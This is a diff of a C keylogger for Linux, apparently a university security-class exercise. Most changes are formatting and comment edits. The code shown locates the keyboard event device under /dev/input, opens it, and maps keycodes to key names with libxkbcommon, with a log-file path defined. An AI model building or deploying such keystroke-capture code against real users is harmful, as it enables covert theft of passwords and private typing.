@@ -1,3 +1,4 @@
+
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
@@ -8,8 +9,11 @@
 #include <linux/input.h>
 #include <xkbcommon/xkbcommon.h>
 
-//aqui se va a guardar la cadena  
+// Aquí se va a guardar la cadena  
 #define LOGFILEPATH "E:/Practicas/ClaseSI/Keylogger/keylogger.txt"
+
+// Prototipo de la función getKeyName
+char* getKeyName(struct xkb_state* state, int code);
 
 // Función para obtener el evento del teclado
 char* getEvent() {
@@ -17,9 +21,10 @@ char* getEvent() {
     char* command = (char*) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
     static char event[8];
     FILE* pipe = popen(command, "r");
-    if (!pipe)
+    if (!pipe) {
         perror("popen");
         exit(1);
+    }
     // Obtener la cadena de texto del evento correspondiente al teclado
     fgets(event, sizeof(event), pipe);
     pclose(pipe);
@@ -27,17 +32,17 @@ char* getEvent() {
     return event;
 }
 
-int main(){
-  struct input_event ev;
-  // ruta al directorio de inputs
-  static char path_keyboard[32] = "/dev/input/";
-  // concatenar variable keyboard
-  strcat(path_keyboard, getEvent());
-  // eliminar último caracter (breakline)
-  path_keyboard[strlen(path_keyboard)-1] = 0;
-  // leer ruta a input
-  int device_keyboard = open(path_keyboard, O_RDONLY);
-  // Imprimir error
+int main() {
+    struct input_event ev;
+    // Ruta al directorio de inputs
+    static char path_keyboard[32] = "/dev/input/";
+    // Concatenar variable keyboard
+    strcat(path_keyboard, getEvent());
+    // Eliminar último caracter (breakline)
+    path_keyboard[strlen(path_keyboard)-1] = 0;
+    // Leer ruta a input
+    int device_keyboard = open(path_keyboard, O_RDONLY);
+    // Imprimir error
     if (errno > 0) {
         perror("open");
         return 1;
@@ -94,7 +99,7 @@ int main(){
 // Función para mapear el código de tecla a un carácter legible usando libxkbcommon
 char* getKeyName(struct xkb_state* state, int code) {
     static char key[32];
-    xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, code + 8); // xkbcommon uses keycodes offset by 8
+    xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, code + 8); // xkbcommon desplazamiento de 8
     xkb_keysym_get_name(keysym, key, sizeof(key));
     return key;
 }
